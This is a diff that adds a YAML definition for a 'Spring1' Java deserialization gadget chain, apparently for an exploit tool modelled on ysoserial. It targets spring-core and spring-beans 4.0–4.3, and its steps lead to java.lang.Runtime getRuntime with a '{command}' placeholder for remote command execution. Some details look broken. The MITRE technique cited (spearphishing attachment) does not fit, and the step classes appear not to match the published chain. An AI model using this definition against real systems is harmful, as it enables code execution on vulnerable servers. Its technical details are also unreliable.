@@ -1,0 +1,28 @@
+name: "Spring1"
+category: "spring"
+description: "Spring1 gadget chain using ReflectionUtils and MethodInvoker"
+jdk_version: "all"
+dependencies:
+  - name: "spring-core"
+    version: "4.0-4.3"
+  - name: "spring-beans"
+    version: "4.0-4.3"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "org.springframework.beans.factory.support.DefaultListableBeanFactory"
+    method_name: "readObject"
+    parameters: []
+  - class_name: "org.springframework.beans.factory.config.MethodInvokingFactoryBean"
+    method_name: "getObject"
+    parameters:
+      - "java.lang.Runtime"
+      - "getRuntime"
+      - "{command}"
+  - class_name: "org.springframework.beans.factory.config.PropertyPathFactoryBean"
+    method_name: "getObject"
+    parameters: []
